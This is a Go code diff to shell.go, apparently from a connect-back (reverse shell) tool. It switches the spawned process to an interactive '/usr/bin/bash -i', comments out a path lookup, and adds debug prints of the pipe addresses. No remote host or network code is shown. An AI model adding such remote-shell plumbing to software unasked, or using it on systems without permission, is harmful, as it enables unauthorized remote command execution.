@@ -47,21 +47,22 @@ type RealShell struct {
 // Get shell for CB-initiated peer:
 func (g RealShellGetter) GetConnectBackInitiatedShell() BashShell {
 	// If bash exists on the system, find it, save the path:
-	var bShell RealShell
+	//var bShell RealShell
 	var pointerToShell *RealShell
 
-	bashCopPath, err := exec.LookPath(`/usr/bin/bash`) // bashPath @0xfaraday
-	if err != nil {
-		fmt.Printf("Error finding bash shell path (shell.go): %v\n", err)
-		os.Stderr.WriteString(" " + err.Error() + "\n")
-		os.Exit(1)
-	}
+	//bashCopPath, err := exec.LookPath(`/usr/bin/bash`) // bashPath @0xfaraday
+	// if err != nil {
+	// 	fmt.Printf("Error finding bash shell path (shell.go): %v\n", err)
+	// 	os.Stderr.WriteString(" " + err.Error() + "\n")
+	// 	os.Exit(1)
+	// }
 
 	// Initiate bShell with the struct & process created by exec.Command:
-	bShell = RealShell{realShell: exec.Command(bashCopPath, "--norc")}
+	pointerToShell = &RealShell{realShell: exec.Command("/usr/bin/bash", "-i")}
 
 	// Get the pointer to the shell process and & return it:
-	pointerToShell = &bShell
+	//	pointerToShell = &bShell
+	fmt.Printf("Address of shell in shell.go = %p\n", pointerToShell)
 	return pointerToShell
 }
 
@@ -89,6 +90,7 @@ func (s *RealShell) PipeStdin() *io.WriteCloser {
 
 	// Get pointer to stdin pipe & return it:
 	var pointerToBashIn *io.WriteCloser = &bashIn
+	fmt.Printf("Stdin address (shell.go) = %p\n", pointerToBashIn)
 	return pointerToBashIn
 }
 
@@ -104,6 +106,7 @@ func (s *RealShell) PipeStdout() *io.ReadCloser {
 
 	// Get pointer to stdout pipe & return it:
 	var pointerToBashOut *io.ReadCloser = &bashOut
+	fmt.Printf("Stdout address (shell.go) = %p\n", pointerToBashOut)
 	return pointerToBashOut
 }
 
@@ -119,5 +122,6 @@ func (s *RealShell) PipeStderr() *io.ReadCloser {
 
 	// Get pointer to stderr pipe & return it:
 	var pointerToBashErr *io.ReadCloser = &bashErr
+	fmt.Printf("Stderr address (shell.go) = %p\n", pointerToBashErr)
 	return pointerToBashErr
 }
